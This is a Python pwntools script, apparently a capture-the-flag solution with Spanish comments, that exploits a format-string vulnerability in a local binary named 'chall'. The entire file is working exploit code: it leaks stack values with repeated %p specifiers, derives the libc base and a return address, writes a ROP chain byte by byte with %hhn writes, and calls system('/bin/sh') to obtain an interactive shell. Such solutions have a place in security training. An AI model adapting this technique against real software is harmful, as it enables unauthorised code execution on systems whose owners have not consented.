# solve.py
from pwn import *

exe = context.binary = ELF('./chall')
libc = exe.libc
io = process(exe.path)

# 1. Inspeccionar el stack
io.sendlineafter(b">> ",b"%10p"*90)  
stack = io.recvline(False)
stack = [
       p64(int(s,16))
       for s in stack.replace(b"(nil)",b"0x0").replace(b"0x",b" ").split()
]


# 2. Obtener libc base y direccion de retorno a la direccion anterior al valor de offset 0
libc_base = u64(stack[60]) - 0x29D90
libc.address = libc_base
ret_addr = u64(stack[6]) - 0x120


# 3. ROP
rop = ROP([exe,libc])
rop.raw(rop.ret.address)                            # Alinear el stack  
rop.call("system",[next(libc.search(b"/bin/sh"))])
chain = rop.chain()

for i in range(len(chain)):
    p = b""
    if chain[i] != 0:
        p += f"%57${chain[i]}x".encode()
    p += b"%13$hhn"
    p = p.ljust(24, b"_")                   
    p += p64(ret_addr + i)
    io.sendlineafter(b">> ", p)

s = b"%s".ljust(8,b"_")
io.sendlineafter(b">> ",s)                        # Provocar el retorno y con ello la llamada a nuestro codigo
io.interactive()
